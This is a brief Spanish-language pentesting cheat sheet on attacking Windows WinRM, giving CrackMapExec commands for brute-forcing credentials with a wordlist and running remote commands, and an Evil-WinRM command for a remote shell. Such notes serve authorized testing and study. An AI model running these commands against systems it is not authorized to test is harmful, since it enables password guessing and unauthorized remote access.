Permite ejecución remota de comandos en sistemas Windows mediante HTTP/HTTPS.

• Usa puertos 5985 (HTTP) / 5986 (HTTPS)  
• Requiere credenciales válidas  
• Alternativa a RDP y SMB

## Enumeración / Fuerza bruta (CrackMapExec)

Prueba credenciales contra WinRM.

```
crackmapexec winrm IP -u administrator -p DICCIONARIO
```

## Ejecución de comandos (CrackMapExec)

Ejecuta comandos si las credenciales son válidas.

```
crackmapexec winrm IP -u USUARIO -p PASSWORD -x "COMMAND" 
```

## Acceso remoto (Evil-WinRM)

Obtiene una shell remota en el sistema.

```
evil-winrm.rb -u USUARIO -p 'PASSWORD' -i IP 
```

